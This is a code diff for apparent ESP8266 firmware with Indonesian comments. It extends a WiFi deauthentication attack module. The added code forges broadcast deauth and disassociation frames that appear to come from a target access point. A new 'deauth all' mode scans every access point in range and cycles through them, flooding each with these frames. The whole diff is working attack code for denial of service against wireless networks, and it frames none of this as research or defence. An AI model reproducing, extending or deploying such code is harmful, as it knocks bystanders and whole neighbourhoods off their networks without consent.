@@ -19,6 +19,8 @@ static scan_entry s_scan[DA_MAX_AP];
 static uint8_t    s_scanN = 0;
 
 static bool     s_attacking = false;
+static bool     s_allMode   = false;   // gempur SEMUA AP (sweep)
+static uint8_t  s_allIdx    = 0;
 static uint8_t  s_bssid[6];
 static uint8_t  s_ch = 1;
 static char     s_ssid[33] = {0};
@@ -43,10 +45,22 @@ static int build_deauth(uint8_t* p, const uint8_t* dst, const uint8_t* bssid,
   return i;
 }
 
+// kirim deauth + disassoc broadcast yang seolah dari `bssid`
+static void blast(const uint8_t* bssid) {
+  static const uint8_t bcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
+  int len = build_deauth(s_pkt, bcast, bssid, 12, 1);
+  if (wifi_send_pkt_freedom(s_pkt, len, 0) == 0) s_sent++; else s_fail++;
+  delay(1);
+  len = build_deauth(s_pkt, bcast, bssid, 10, 1);
+  if (wifi_send_pkt_freedom(s_pkt, len, 0) == 0) s_sent++; else s_fail++;
+  delay(1);
+}
+
 // ------------------------------------------------------------- lifecycle ---
 static void attack_stop(bool announce) {
   if (!s_attacking) { if (announce) Serial.println(F("[deauth] tidak jalan")); return; }
   s_attacking = false;
+  s_allMode   = false;
   wifi_promiscuous_enable(0);
   if (announce)
     Serial.printf("[deauth] STOP — sukses=%lu gagal=%lu\n",
@@ -57,22 +71,26 @@ void deauth_stop() { attack_stop(false); }          // cross-module, senyap
 void deauth_loop() {
   if (!s_attacking) return;
 
-  static const uint8_t bcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
-  wifi_set_channel(s_ch);
-
-  int len = build_deauth(s_pkt, bcast, s_bssid, 12, 1);   // deauth broadcast
-  if (wifi_send_pkt_freedom(s_pkt, len, 0) == 0) s_sent++; else s_fail++;
-  delay(1);
-  len = build_deauth(s_pkt, bcast, s_bssid, 10, 1);       // disassoc broadcast
-  if (wifi_send_pkt_freedom(s_pkt, len, 0) == 0) s_sent++; else s_fail++;
-  delay(1);
+  if (s_allMode) {                                  // sweep semua AP hasil scan
+    if (s_scanN == 0) return;
+    wifi_set_channel(s_scan[s_allIdx].channel);
+    blast(s_scan[s_allIdx].bssid);
+    s_allIdx = (uint8_t)((s_allIdx + 1) % s_scanN);
+  } else {                                          // 1 AP target
+    wifi_set_channel(s_ch);
+    blast(s_bssid);
+  }
 
   uint32_t now = millis();
   if (now - s_lastStat >= 2000) {
     s_lastStat = now;
-    Serial.printf("[deauth] %s (%s) ch%d : sukses=%lu gagal=%lu\n",
-      s_ssid[0] ? s_ssid : "<hidden>", nc_mac_str(s_bssid), s_ch,
-      (unsigned long)s_sent, (unsigned long)s_fail);
+    if (s_allMode)
+      Serial.printf("[deauth-all] %u AP : sukses=%lu gagal=%lu\n",
+        s_scanN, (unsigned long)s_sent, (unsigned long)s_fail);
+    else
+      Serial.printf("[deauth] %s (%s) ch%d : sukses=%lu gagal=%lu\n",
+        s_ssid[0] ? s_ssid : "<hidden>", nc_mac_str(s_bssid), s_ch,
+        (unsigned long)s_sent, (unsigned long)s_fail);
   }
 }
 
@@ -119,15 +137,12 @@ void deauth_attack(const uint8_t* bssid, uint8_t ch, const char* ssid) {
 bool deauth_active() { return s_attacking; }
 void deauth_stats(uint32_t* sent, uint32_t* fail) { if (sent) *sent = s_sent; if (fail) *fail = s_fail; }
 const char* deauth_ssid() { return s_ssid; }
+uint8_t deauth_all_count() { return s_scanN; }
 
-static void cmd_deauth(int argc, char** argv) {
-  if (argc >= 2 && strcasecmp(argv[1], "stop") == 0) { attack_stop(true); return; }
-
+static void scan_aps() {
   if (sniffer_running()) sniffer_stop();
   beacon_stop(); pdeauth_stop(); evil_stop();      // jangan rebutan channel/mode
-  Serial.println(F("[deauth] memindai AP..."));
   int n = WiFi.scanNetworks(false, true);
-
   s_scanN = 0;
   for (int i = 0; i < n && s_scanN < DA_MAX_AP; i++) {
     memcpy(s_scan[s_scanN].bssid, WiFi.BSSID(i), 6);
@@ -138,7 +153,27 @@ static void cmd_deauth(int argc, char** argv) {
     s_scanN++;
   }
   WiFi.scanDelete();
+}
 
+// gempur SEMUA AP dalam jangkauan (sweep semua channel)
+void deauth_all_start() {
+  Serial.println(F("[deauth-all] memindai semua AP..."));
+  scan_aps();
+  if (s_scanN == 0) { Serial.println(F("[deauth-all] tidak ada AP")); return; }
+  wifi_set_opmode_current(STATION_MODE);
+  wifi_set_promiscuous_rx_cb(nullcb);
+  wifi_promiscuous_enable(1);
+  s_attacking = true; s_allMode = true; s_allIdx = 0;
+  s_sent = s_fail = 0; s_lastStat = millis();
+  Serial.printf("[deauth-all] gempur %u AP (sweep semua channel)\n", s_scanN);
+}
+
+static void cmd_deauth(int argc, char** argv) {
+  if (argc >= 2 && strcasecmp(argv[1], "stop") == 0) { attack_stop(true); return; }
+  if (argc >= 2 && strcasecmp(argv[1], "all") == 0)  { deauth_all_start(); return; }
+
+  Serial.println(F("[deauth] memindai AP..."));
+  scan_aps();
   if (s_scanN == 0) { Serial.println(F("[deauth] tidak ada AP")); return; }
 
   Serial.println(F("=== pilih AP untuk DEAUTH ==="));
@@ -151,5 +186,5 @@ static void cmd_deauth(int argc, char** argv) {
 }
 
 void deauth_init() {
-  cli_register("deauth", "deauth AP terpilih (deauth | deauth stop)", cmd_deauth);
+  cli_register("deauth", "deauth (deauth | deauth all | deauth stop)", cmd_deauth);
 }
